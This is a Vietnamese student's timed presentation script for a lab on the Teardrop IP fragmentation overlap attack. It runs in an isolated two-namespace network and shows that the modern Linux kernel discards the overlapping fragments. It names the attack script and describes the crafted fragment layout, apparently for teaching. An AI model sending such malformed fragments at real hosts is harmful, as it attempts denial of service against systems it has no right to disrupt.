> * Mở ứng dụng Konsole / Terminal và chia đôi màn hình (Split Screen):
>   * **Cửa sổ bên trái:** Máy Kẻ tấn công `h1` (`10.0.0.1`).
>   * **Cửa sổ bên phải:** Máy Nạn nhân `h2` (`10.0.0.2`).

#### [0:00 - 0:35] Mở đầu & Giới thiệu đề tài
* **Lời thoại:**
  *"Kính chào thầy và các bạn! Hôm nay em xin trình bày bài thực hành số 06: Kỹ thuật tấn công từ chối dịch vụ phân mảnh IP Teardrop Attack (IP Fragmentation Overlap DoS) và Kiểm chứng tính miễn nhiễm của nhân Linux hiện đại. Trong giao thức IPv4, khi gói tin có kích thước vượt quá MTU của đường truyền, nó sẽ bị chia nhỏ thành nhiều mảnh. Bên nhận dựa vào trường Identification và Fragment Offset để ghép lại. Lỗ hổng Teardrop kinh điển phát sinh khi kẻ tấn công cố tình tạo ra các mảnh có offset chồng lấn đè lên nhau, khiến hàm ghép mảnh của hệ điều hành bị lỗi tràn bộ nhớ và đánh sập máy tính!"*

#### [0:35 - 1:10] Bước 1: Khởi tạo mô hình mạng ảo 2 máy
* **Thao tác trên terminal trái:**
  ```bash
  sudo bash setup_pair.sh
  ```
* **Lời thoại giải thích:**
  *"Đầu tiên, em thực thi script `setup_pair.sh`. Kịch bản này sử dụng Network Namespace để tạo hai máy độc lập: máy tấn công h1 có địa chỉ `10.0.0.1`, và máy nạn nhân h2 có địa chỉ `10.0.0.2`, kết nối trực tiếp qua cặp card mạng ảo veth. Kết quả ping kiểm tra ban đầu phản hồi trơn tru, mạng đã sẵn sàng cho bài thử nghiệm!"*

#### [1:10 - 2:00] Bước 2: Kiểm tra bộ đếm ghép mảnh trước tấn công & Bật tcpdump
* **Thao tác 1 (Terminal phải - Kiểm tra chỉ số SNMP Reassembly của h2):**
  ```bash
  sudo ip netns exec h2 netstat -s | grep -i -E "reassembl|fragments"
  ```
  * **Lời thoại:**
    *"Tại cửa sổ bên phải của máy nạn nhân h2, em kiểm tra bộ đếm thống kê IP của Kernel bằng lệnh `netstat -s`. Như thầy và các bạn thấy, chỉ số `reassemblies failed` hiện tại đang bằng 0, nghĩa là máy nạn nhân chưa hề gặp bất kỳ lỗi ghép mảnh nào."*

* **Thao tác 2 (Terminal phải - Bật tcpdump bắt các gói tin phân mảnh):**
  ```bash
  sudo ip netns exec h2 tcpdump -i h2-veth -nn -v 'ip[6:2] & 0x3fff != 0'
  ```
  * **Lời thoại:**
    *"Tiếp theo, em bật `tcpdump` trên card `h2-veth` với bộ lọc `ip[6:2] & 0x3fff != 0` để chỉ bắt những gói tin có cờ More Fragments hoặc có Fragment Offset lớn hơn 0."*

#### [2:00 - 3:15] Bước 3: Phát động tấn công phân mảnh chồng lấn Teardrop
* **Thao tác trên terminal trái:**
  ```bash
  sudo ip netns exec h1 python3 teardrop_attack.py
  ```
* **Lời thoại giải thích:**
  *"Bây giờ tại máy tấn công h1 bên trái, em kích hoạt kịch bản tấn công `teardrop_attack.py`. File Python này sử dụng thư viện Scapy để chế tạo gói tin phân mảnh bất thường ID = 1234:*
  * *Mảnh 1: offset = 0, MF = 1, mang 24 bytes.*
  * *Mảnh 2: offset = 1 (tức byte 8), MF = 0, mang 24 bytes.*
  * *Khoảng từ byte 8 đến byte 23 bị chồng lấn 16 bytes!*
  
  *Thầy và các bạn hãy nhìn sang tcpdump bên phải: Hai mảnh UDP ID 1234 với offset 0 và offset 8 đã ập tới card mạng của nạn nhân!"*

#### [3:15 - 4:10] Bước 4: Kiểm chứng tính miễn nhiễm của Linux Kernel & Đo nhịp tim
* **Thao tác 1 (Terminal phải - Dừng tcpdump, kiểm tra lại bộ đếm SNMP):**
  ```bash
  sudo ip netns exec h2 netstat -s | grep -i -E "reassembl|fragments"
  ```
  * **Lời thoại:**
    *"Bây giờ trên máy nạn nhân h2, em kiểm tra lại bộ thống kê mạng: Bộ đếm yêu cầu ghép mảnh `ReasmReqds` đã tăng lên 2 và bộ đếm ghép mảnh thất bại `ReasmFails` đã tăng lên 1! Điều này chứng minh nhân Linux Kernel đã phát hiện sự bất thường của các mảnh đè lên nhau và chủ động tiêu hủy an toàn!"*

* **Thao tác 2 (Terminal trái - Gửi ping kiểm tra sự sống của nạn nhân):**
  ```bash
  sudo ip netns exec h1 ping -c 3 10.0.0.2
  ```
  * **Lời thoại:**
    *"Để chứng minh máy nạn nhân không hề bị tê liệt, từ máy h1 em gửi lệnh ping kiểm tra nhịp tim tới `10.0.0.2`. Toàn bộ 3 gói ping đều phản hồi bình thường! Máy nạn nhân hoàn toàn miễn nhiễm và sống sót bình an!"*

#### [4:10 - 4:50] Bước 5: Dọn dẹp & Giải pháp phòng vệ
* **Thao tác trên terminal trái:**
  ```bash
  sudo bash clean_pair.sh
  ```
* **Lời thoại giải thích:**
  *"Em thực thi lệnh `sudo bash clean_pair.sh` để dọn dẹp card mạng và namespace. Em xin kết thúc bài thực hành số 06 tại đây!"*
